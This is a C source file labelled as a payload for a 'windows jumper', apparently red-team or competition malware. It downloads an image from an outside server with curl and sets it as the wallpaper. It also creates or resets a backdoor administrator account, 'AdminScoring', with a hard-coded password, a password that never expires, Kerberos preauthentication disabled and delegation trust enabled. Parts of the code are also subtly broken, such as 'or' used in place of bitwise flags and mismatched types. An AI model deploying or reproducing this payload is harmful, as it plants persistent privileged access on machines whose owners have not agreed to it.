//Michael Burke
//Payload for the windows jumper.

#include <windows.h>

//needed for user addition
#include <LM.h>
#include <stdio.h>
/*

#include <unistd.h>
//*/
int changeBackground() {
    if (access("C:\\uwubuntu.png", F_OK) != 0) {
        //file does not exist
        system("curl http://server.mdbooktech.com/uwubuntu.png -s > C:\\uwubuntu.png");
        //printf("Downloaded uwubuntu.png\n");
    }
    else {
        char wallpaperpath[300];
        SystemParametersInfo(SPI_GETDESKWALLPAPER, 300, wallpaperpath, 0);
        if (strcmp(wallpaperpath, "C:\\uwubuntu.png") == 0) {
            //printf("Already set\n");
            return 1;
        }
    }
    //printf("Not set. Setting...\n");
    const wchar_t* path = L"C:\\uwubuntu.png";
    int result;
    //printf("Setting as desktop background...\n");
    result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)path, SPIF_UPDATEINIFILE);
    if (result == 1) {
        //printf("Done");
        return 1;
    }
    return 0;
}

//NetUserSetInfo for all users and change country code for Ukranien (UA) / 866




int RDPSetup() {
    //taken from https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd?redirectedfrom=MSDN
    USER_INFO_1 ui;
    DWORD level = 1;
    DWORD error = 0;

    ui.usri1_name = "AdminScoring";
    ui.usri1_password = "defaultscoringpass";
    ui.usri1_priv = USER_PRIV_ADMIN;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = "Scoring Account";
    ui.usri1_flags = UF_SCRIPT or UF_DONT_EXPIRE_PASSWD or UF_DONT_REQUIRE_PREAUTH or UF_TRUSTED_FOR_DELEGATION or UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
    ui.usri1_script_path = NULL;

    NET_API_STATUS status = NetUserAdd(NULL, 1, (LPBYTE)&ui, &error);
    if (status != NERR_Success) {
        USER_INFO_4 info;
        //info = {};
        info.usri4_name = "AdminScoring";
        info.usri4_password = "defaultscoringpass";
        info.usri4_priv = USER_PRIV_ADMIN;
        info.usri4_home_dir = NULL;
        info.usri4_comment = "Scoring Account";
        info.usri4_flags = UF_SCRIPT or UF_DONT_EXPIRE_PASSWD or UF_DONT_REQUIRE_PREAUTH or UF_TRUSTED_FOR_DELEGATION or UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
        info.usri4_script_path = NULL;
        info.usri4_full_name = "Admin Scoring";
        info.usri4_usr_comment = NULL;
        info.usri4_parms = NULL;
        info.usri4_workstations = NULL;
        info.usri4_acct_expires = TIMEQ_FOREVER;
        info.usri4_logon_hours = NULL;
        info.usri4_logon_server = NULL;
        info.usri4_country_code = "US";
        info.usri4_code_page = 437;
        info.usri4_primary_group_id = "World";
        info.usri4_profile = NULL;
        info.usri4_home_dir_drive = "C:";
        info.usri4_password_expired = 0;

        status = NetUserSetInfo(NULL, "AdminScoring", 4, &info, &error);

    }
    else {
        printf("adding user worked\n");
    }
}
int payload() {
    //Execute whatever you want here
    changeBackground();
    RDPSetup();

}

/*
int main(int argc, char *argv[]){
    payload();
}
//*/
